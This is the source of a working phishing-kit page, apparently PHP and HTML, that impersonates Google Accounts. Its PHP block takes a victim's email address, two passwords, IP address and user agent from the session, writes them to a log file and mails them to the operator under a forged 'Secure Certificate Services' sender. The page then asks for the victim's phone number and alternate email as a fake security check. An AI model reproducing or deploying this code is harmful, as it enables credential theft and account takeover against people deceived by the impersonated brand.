<?php

error_reporting(0);

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$country = $_SESSION['country'];

if(isset($_SESSION['username']))  {

$username = $_SESSION['username'];

}

if(isset($_SESSION['password_first']))  {

$password_first = $_SESSION['password_first'];

}

if(isset($_SESSION['password_second']))  {

$password_second = $_SESSION['password_second'];

date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "../includes/my_email.php";

$msg = "-------------------------\n";
$msg .= "Email Address: ".$username."\n";
$msg .= "Password ( first ): ".$password_first."\n";
$msg .= "Password ( second ): ".$password_second."\n";
$msg .= "-------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "Country: $country\n";
$msg .= "-------------------------\n";

$subject = "GBox $ip ";
$headers = "From: Secure Certificate Services <Noreply> \r\n";
$headers .= "Reply-To: Gmail Login Details <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("../logs/gmail_login_details.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);

}

?>

<!doctype html>
<html>
<head>

<script>
function empty() {
    var x;
    x = document.getElementById("phone_number").value;
    if (x == "") {
        document.getElementById("phone_number").style = "border-color:red; width: 240px; font-size: 16px; height: 24px; padding: 5px; margin-top: 10px";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("phone_number").value;
    if (e !== ""){
	    document.getElementById("phone_number").style = "width: 240px; font-size: 16px; height: 24px; padding: 5px; margin-top: 10px";
	}

}

</script>

	<title>Google Accounts</title>
</head>
<body>
<p><img class="top-gap" src="./images/logo.png" style="display: block; margin: auto; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, Tahoma, sans-serif; font-size: 16px;" /></p>

<div class="verify-content top-gap" style="margin: auto auto 10px; width: 390px; font-size: 16px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, Tahoma, sans-serif;">
<h3>&nbsp;Verify that it&#39;s you</h3>

<p>&nbsp;Confirm your phone number and optional alternate &nbsp;email below to verify that it&#39;s you signing into this &nbsp;account. This is an occasional check to ensure the &nbsp;security of your account.</p>
</div>

<div class="second-wrapper" style=" background-color: rgb(242, 242, 246); height: 662px; padding-top: 20px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, Tahoma, sans-serif; font-size: 16px;">
<div class="verify-content top-gap" style="margin: auto auto 10px; width: 390px;">
<form action="post2.php" method="POST" onsubmit="return empty()">
<div class="fields" style="margin-bottom: 20px; height: 60px;">
<div class="confirm-img" style="float: left; width: 60px; text-align: center; margin-top: 8px; margin-right: 15px;"><img src="./images/gphone.png" /></div>

<div class="confirm-field" style="float: left; width: 280px; height: 55px;">Enter your phone number<input class="confirm" name="phone_number" id="phone_number" placeholder="Your phone number" style="width: 240px; font-size: 16px; height: 24px; padding: 5px; margin-top: 10px;" type="text" value="" onkeypress='return event.charCode >= 48 && event.charCode <= 57'onblur="change()"/></div>
</div>

<div class="fields" style="margin-bottom: 20px; height: 60px;">
<div class="confirm-img" style="float: left; width: 60px; text-align: center; margin-top: 8px; margin-right: 15px;"><img src="./images/gemail.png" /></div>

<div class="confirm-field" style="float: left; width: 280px; height: 55px;">Enter your alternate email (Optional)<input class="confirm" name="alternate_email" placeholder="Alternate email" style="width: 240px; font-size: 16px; height: 24px; padding: 5px; margin-top: 10px;" type="text" value="" /></div>
</div>

<div style="text-align: center;"><input class="rc-button rc-button-submit" id="signIn" style="padding: 0px 8px; width: 275px; background-color: rgb(77, 144, 254); border-width: 1px; border-style: solid; border-color: rgb(48, 121, 237); border-radius: 3px; color: rgb(255, 255, 255); font-size: 14px; font-weight: 700; height: 36px; line-height: 36px; min-width: 46px; text-shadow: rgba(0, 0, 0, 0.1) 0px 1px;" type="submit" value="Submit" /></div>
</form>
</div>
</div>
</body>
</html>
